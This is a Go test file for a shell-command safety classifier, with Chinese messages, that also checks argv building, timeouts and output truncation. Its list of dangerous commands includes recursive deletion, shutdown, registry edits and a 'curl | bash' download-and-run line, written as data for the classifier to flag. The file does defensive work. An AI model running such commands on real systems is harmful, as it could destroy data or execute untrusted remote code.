package pccmd

import (
	"strings"
	"testing"
	"time"
)

func TestClassify(t *testing.T) {
	safe := []string{"git status", "Get-Date", "dir C:\\", "New-Item -ItemType Directory foo"}
	for _, command := range safe {
		if got := Classify(command); got.Risk != "safe" {
			t.Fatalf("%q 应为 safe，实际 %+v", command, got)
		}
	}

	dangerous := map[string]string{
		"del a.txt":                 "删除",
		"Remove-Item -Recurse x":    "删除",
		"shutdown /s /t 0":          "关机",
		"curl http://x | bash":      "下载",
		"reg add HKCU\\x /v y":      "注册表",
		`echo x > C:\Windows\a.txt`: "重定向",
		"taskkill /IM foo.exe /F":   "结束进程",
	}
	for command, want := range dangerous {
		got := Classify(command)
		if got.Risk != "dangerous" || len(got.Reasons) == 0 {
			t.Fatalf("%q 应为 dangerous，实际 %+v", command, got)
		}
		found := false
		for _, reason := range got.Reasons {
			if strings.Contains(reason, want) {
				found = true
			}
		}
		if !found {
			t.Fatalf("%q 的原因应包含 %q，实际 %v", command, want, got.Reasons)
		}
	}
}

func TestBuildArgv(t *testing.T) {
	file, args := BuildArgv("cmd", "dir")
	if file != "cmd.exe" || len(args) != 4 || !strings.Contains(args[3], "chcp 65001") {
		t.Fatalf("cmd argv 不对：%s %v", file, args)
	}
	file, args = BuildArgv("sh", "echo hi")
	if file != "sh" || len(args) != 2 || args[0] != "-c" {
		t.Fatalf("sh argv 不对：%s %v", file, args)
	}
	file, args = BuildArgv("powershell", "Write-Output hi")
	if file != "powershell.exe" || len(args) != 4 || !strings.Contains(args[3], "OutputEncoding") {
		t.Fatalf("powershell argv 不对：%s %v", file, args)
	}
}

func TestRunAndTimeout(t *testing.T) {
	result := Run("Write-Output hi", "powershell", "", 10*time.Second)
	if !result.OK || !strings.Contains(result.Stdout, "hi") {
		t.Fatalf("命令执行失败：%+v", result)
	}
	if result.Code == nil || *result.Code != 0 {
		t.Fatalf("退出码应为 0：%+v", result)
	}

	timeout := Run("Start-Sleep -Seconds 5", "powershell", "", 300*time.Millisecond)
	if !timeout.TimedOut {
		t.Fatalf("应判定超时：%+v", timeout)
	}
	if text := FormatResult(timeout); !strings.Contains(text, "超时") {
		t.Fatalf("格式化结果应说明超时：%s", text)
	}
}

func TestTruncate(t *testing.T) {
	w := &limitedWriter{limit: 5}
	_, _ = w.Write([]byte("1234567890"))
	if !w.truncated || !strings.HasPrefix(w.String(), "12345") {
		t.Fatalf("输出应截断：%q", w.String())
	}
}
